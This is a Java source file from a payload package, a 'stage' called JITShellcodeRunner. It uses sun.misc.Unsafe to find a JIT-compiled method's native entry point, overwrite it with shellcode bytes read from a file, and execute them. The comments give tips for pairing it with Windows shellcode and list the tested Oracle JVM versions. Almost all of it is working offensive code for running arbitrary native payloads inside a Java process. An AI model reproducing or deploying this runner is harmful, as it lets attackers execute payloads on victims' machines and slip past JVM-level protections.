package javapayload.stage;
/*
 * Running shellcode from Java without JNI (i. e. loading a DLL from disk).
 * (c) 2011 Michael Schierl <schierlm at gmx dot de> (Twitter @mihi42)
 * 
 * Thanks to Joshua J. Drake (Twitter @jduck1337) for help with
 * making it work on Win64.
 * 
 * On Win32, prepend /shellcode/win32_shellcode-prefix.payload to your
 * EXITFUNC=thread shellcode to minimize the risk of crashing
 * your Java process when your shellcode finishes.
 * 
 * This version has been tested on:
 * 
 * Oracle 1.4.2_11 Win32 (-client, -server)
 * Oracle 1.5.0_06 Win32 (-client, -server)  
 * Oracle 1.6.0_19 Win32 (-client, -server)
 * Oracle 1.7.0_01 Win32 (-client, -server)
 * 
 * Oracle 1.6.0_26 Linux32 (-client, -server)
 * Oracle 1.7.0_01 Linux32 (-client, -server)
 *   
 */
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.PrintStream;
import java.lang.reflect.Array;
import java.lang.reflect.Field;

import sun.misc.Unsafe;

public class JITShellcodeRunner {
	private static Object methodObject;
	public Object obj1, obj2; // for detecting compressed pointers

	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("[-] Need shellcode file parameter");
			return;
		}
		File file = new File(args[0]);
		if (file.length() > 5120) {
			System.out.println("[-] File too large, " + file.length() + " > 5120");
			return;
		}
		byte[] shellcode = new byte[(int) file.length()];
		DataInputStream dis = new DataInputStream(new FileInputStream(file));
		dis.readFully(shellcode);
		dis.close();
		if(run(System.out, shellcode)) 
			System.exit(42);
	}

	public static boolean run(PrintStream log, byte[] shellcode) throws Exception {
		if (shellcode.length > 5120) {
			log.println("[-] File too large, " + shellcode.length + " > 5120");
			return false;
		}
		// avoid Unsafe.class literal here since it may introduce
		// a synthetic method and disrupt our calculations.
		java.lang.reflect.Field unsafeField = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
		unsafeField.setAccessible(true);
		Unsafe unsafe = (Unsafe) unsafeField.get(null);
		long addressSize = unsafe.addressSize();
		log.println("[*] Address size: " + addressSize);
		Class thisClass = Class.forName("javapayload.stage.JITShellcodeRunner");
		boolean compressedPointers = false;
		if (addressSize == 8) {
			Field fld1 = thisClass.getDeclaredField("obj1");
			Field fld2 = thisClass.getDeclaredField("obj2");
			long distance = Math.abs(unsafe.objectFieldOffset(fld1) - unsafe.objectFieldOffset(fld2));
			compressedPointers = (distance == 4);
			if (compressedPointers) 
				log.println("[*] Compressed pointers detected");
		}
		final int METHOD_COUNT = thisClass.getDeclaredMethods().length + 1;
		log.println("[*] Shellcode class has " + METHOD_COUNT + " methods.");
		Field staticField = thisClass.getDeclaredField("methodObject");
		final Object staticFieldBase = unsafe.staticFieldBase(staticField);
		Object methodArrayBase = staticFieldBase;
		long staticFieldOffset = unsafe.staticFieldOffset(staticField);
		long maxOffset = staticFieldOffset;
		int methodArraySlot = -1;
		long[] values = new long[(int) (maxOffset / addressSize)];
		int firstNonZero = values.length;
		for(boolean retry = false;; retry = true) {
			for (int i = 0; i < values.length; i++) {
				values[i] = addressSize == 8 ? unsafe.getLong(methodArrayBase, (long) (i * addressSize)) : unsafe.getInt(methodArrayBase, (long) (i * addressSize)) & 0xFFFFFFFFL;
			}
			for (int i = 20; i < values.length; i++) {
				if (values[i] != 0) {
					firstNonZero = i;
					break;
				}
			}
			if (retry || firstNonZero != values.length)
				break;
			// Java 7
			log.println("[*] Indirect method array reference detected (JDK7)");
			methodArrayBase = unsafe.getObject(methodArrayBase, 4 * addressSize);
			values = new long[40];
		}
		for (int i = firstNonZero; i < values.length - 5; i++) {
			if (values[i - 2] == 0 && values[i - 1] == 0 && values[i] > 100000 && values[i + 1] > 100000 && values[i + 2] > 100000 && values[i + 2] == values[i + 3]) {
				methodArraySlot = i;
			}
		}
		if (methodArraySlot == -1) {
			log.println("[-] Method array slot not found.");
			return false;
		}
		log.println("[*] Obtaining method array (slot " + methodArraySlot + ")");
		Field methodSlotField = Class.forName("java.lang.reflect.Method").getDeclaredField("slot");
		methodSlotField.setAccessible(true);
		int shellcodeMethodSlot = ((Integer) methodSlotField.get(thisClass.getDeclaredMethod("jitme", new Class[0]))).intValue();
		if (compressedPointers) {
			// method array looks like this:
			// flags 01 00 00 00 00 00 00 00
			// class xx xx xx xx (compressed)
			// length 05 00 00 00
			// elements (compressed each)
			long methodArrayAddr = unsafe.getLong(methodArrayBase, methodArraySlot * addressSize);
			int methodCount = unsafe.getInt(methodArrayAddr + 12);
			if (methodCount != METHOD_COUNT) {
				log.println("[-] ERROR: Array length is " + methodCount + ", should be " + METHOD_COUNT);
				return false;
			}
			log.println("[+] Successfully obtained method array pointer");
			log.println("[*] Obtaining method object (slot " + shellcodeMethodSlot + ")");
			int compressedMethodObjectPointer = unsafe.getInt(methodArrayAddr + 16 + shellcodeMethodSlot * 4);
			unsafe.putInt(staticFieldBase, unsafe.staticFieldOffset(thisClass.getDeclaredField("methodObject")), compressedMethodObjectPointer);
		} else {
			Object methodArray = unsafe.getObject(methodArrayBase, methodArraySlot * addressSize);
			int methodCount = Array.getLength(methodArray);
			if (methodCount != METHOD_COUNT) {
				log.println("[-] ERROR: Array length is " + methodCount + ", should be " + METHOD_COUNT);
				return false;
			}
			log.println("[+] Successfully obtained method array");
			log.println("[*] Obtaining method object (slot " + shellcodeMethodSlot + ")");
			methodObject = Array.get(methodArray, shellcodeMethodSlot);
		}
		log.println("[+] Successfully obtained method object");
		maxOffset = 30 * addressSize;
		values = new long[35];
		int cnt = 16;
		int nmethodSlot = -1;
		boolean found = false;
		while (nmethodSlot == -1 && cnt < 1000000) {
			for (int i = 0; i < cnt; i++) {
				jitme();
			}
			for (int i = 0; i < values.length; i++) {
				values[i] = addressSize == 8 ? unsafe.getLong(methodObject, (long) (i * addressSize)) : unsafe.getInt(methodObject, (long) (i * addressSize)) & 0xFFFFFFFFL;
			}
			nmethodSlot = 0;
			for (int j = 0; j < values.length - 8; j++) {
				if (values[j] % 8 == 1 && values[j + 1] == 1) {
					// more jit needed
					nmethodSlot = -1;
					break;
				} else if (values[j] % 8 == 5 && values[j + 1] == 13) {
					nmethodSlot = j + 5;
					if (values[j + 8] > 100000)
						nmethodSlot = j + 8;
					break;
				} else if (values[j] % 8 == 5 && values[j + 1] == 5) {
					nmethodSlot = j + 2;
					if (values[j + 5] > 100000)
						nmethodSlot = j + 4;
					break;
				}
			}
			if (nmethodSlot > 0 && values[nmethodSlot] == 0)
				nmethodSlot = -1;
			if (!found && nmethodSlot != -1) {
				// jit a bit more to avoid spurious errors
				found = true;
				nmethodSlot = -1;
			}
			cnt *= 2;
		}
		if (nmethodSlot == 0) {
			log.println("[-] NMETHOD pointer slot not found");
			return false;
		}
		log.println("[*] Obtaining NMETHOD pointer (slot " + nmethodSlot + ")");
		long nmethodValue = addressSize == 8 ? unsafe.getLong(methodObject, (long) (nmethodSlot * addressSize)) : unsafe.getInt(methodObject, (long) (nmethodSlot * addressSize)) & 0xFFFFFFFFL;
		log.println("[+] Successfully obtained NMETHOD pointer");
		if (nmethodValue == 0) {
			log.println("[-] ERROR: invalid nmethod slot (or JIT did not run?)");
			return false;
		}
		values = new long[40];
		for (int i = 0; i < values.length; i++) {
			values[i] = addressSize == 8 ? unsafe.getLong(nmethodValue + i * addressSize) : unsafe.getInt(nmethodValue + i * addressSize) & 0xFFFFFFFFL;
		}
		int epOffset = -1;
		for (int i = 0; i < values.length - 3; i++) {
			if (values[i] > 10000 && values[i] == values[i + 1] && (values[i] == values[i + 2]) != (values[i] == values[i + 3])) {
				epOffset = i;
			}
		}
		if (epOffset == -1) {
			log.println("[-] Entry point not found");
			for (int i = 0; i < values.length; i++) {
				log.println("\t"+i+"\t"+Long.toHexString(values[i]));
			}
			return false;
		}
		log.println("[*] Obtaining entry point pointer (offset " + epOffset + ")");
		final long targetAddress = addressSize == 8 ? unsafe.getLong(nmethodValue + epOffset * addressSize) : unsafe.getInt(nmethodValue + epOffset * addressSize) & 0xFFFFFFFFL;
		log.println("[+] Successfully obtained entry point pointer");		
		long ptr = targetAddress;
		Thread.sleep(1000);
		for (int i = 0; i < shellcode.length; i++) {
			unsafe.putByte(ptr, shellcode[i]);
			ptr++;
		}
		log.println("[+] Successfully overwritten JIT method");
		log.println("[*] Executing native method (drum roll...)");
		executed = false;
		runny();
		if (executed) {
			log.println("[-] ERROR: Original method has been executed!");
			return false;
		}
		log.println("[+] Executed native method and returned!");
		return true;
	}
	
	public static void runny() {
		// one more stack frame (that does not get inlined)
		// seems to fix spurious crashes on Java 1.4...
		"42".toString();
		jitme();
	}
		
	private static volatile boolean executed;
	private static volatile int v1, v2, v3, v4, v5;

	private static void jitme() {
		executed = true;
		// On x86: each volatile inc/dec needs 18 bytes,
		// all 320 of them need 5760 bytes,
		// whole JIT method needs 5842 bytes.
		// if you need more shellcode, make a longer method
		v1++; v2++; v3++; v4++; v5++;
		v1++; v2++; v3++; v4++; v5--;
		v1++; v2++; v3++; v4--; v5++;
		v1++; v2++; v3++; v4--; v5--;
		v1++; v2++; v3--; v4++; v5++;
		v1++; v2++; v3--; v4++; v5--;
		v1++; v2++; v3--; v4--; v5++;
		v1++; v2++; v3--; v4--; v5--;
		v1++; v2--; v3++; v4++; v5++;
		v1++; v2--; v3++; v4++; v5--;
		v1++; v2--; v3++; v4--; v5++;
		v1++; v2--; v3++; v4--; v5--;
		v1++; v2--; v3--; v4++; v5++;
		v1++; v2--; v3--; v4++; v5--;
		v1++; v2--; v3--; v4--; v5++;
		v1++; v2--; v3--; v4--; v5--;
		executed = true;
		v1--; v2++; v3++; v4++; v5++;
		v1--; v2++; v3++; v4++; v5--;
		v1--; v2++; v3++; v4--; v5++;
		v1--; v2++; v3++; v4--; v5--;
		v1--; v2++; v3--; v4++; v5++;
		v1--; v2++; v3--; v4++; v5--;
		v1--; v2++; v3--; v4--; v5++;
		v1--; v2++; v3--; v4--; v5--;
		v1--; v2--; v3++; v4++; v5++;
		v1--; v2--; v3++; v4++; v5--;
		v1--; v2--; v3++; v4--; v5++;
		v1--; v2--; v3++; v4--; v5--;
		v1--; v2--; v3--; v4++; v5++;
		v1--; v2--; v3--; v4++; v5--;
		v1--; v2--; v3--; v4--; v5++;
		v1--; v2--; v3--; v4--; v5--;
		if (v1 + v2 + v3 + v4 + v5 != 0)
			throw new RuntimeException();
		v1++; v2++; v3++; v4++; v5++;
		v1++; v2++; v3++; v4++; v5--;
		v1++; v2++; v3++; v4--; v5++;
		v1++; v2++; v3++; v4--; v5--;
		v1++; v2++; v3--; v4++; v5++;
		v1++; v2++; v3--; v4++; v5--;
		v1++; v2++; v3--; v4--; v5++;
		v1++; v2++; v3--; v4--; v5--;
		v1++; v2--; v3++; v4++; v5++;
		v1++; v2--; v3++; v4++; v5--;
		v1++; v2--; v3++; v4--; v5++;
		v1++; v2--; v3++; v4--; v5--;
		v1++; v2--; v3--; v4++; v5++;
		v1++; v2--; v3--; v4++; v5--;
		v1++; v2--; v3--; v4--; v5++;
		v1++; v2--; v3--; v4--; v5--;
		executed = true;
		v1--; v2++; v3++; v4++; v5++;
		v1--; v2++; v3++; v4++; v5--;
		v1--; v2++; v3++; v4--; v5++;
		v1--; v2++; v3++; v4--; v5--;
		v1--; v2++; v3--; v4++; v5++;
		v1--; v2++; v3--; v4++; v5--;
		v1--; v2++; v3--; v4--; v5++;
		v1--; v2++; v3--; v4--; v5--;
		v1--; v2--; v3++; v4++; v5++;
		v1--; v2--; v3++; v4++; v5--;
		v1--; v2--; v3++; v4--; v5++;
		v1--; v2--; v3++; v4--; v5--;
		v1--; v2--; v3--; v4++; v5++;
		v1--; v2--; v3--; v4++; v5--;
		v1--; v2--; v3--; v4--; v5++;
		v1--; v2--; v3--; v4--; v5--;
		executed = true;
	}
}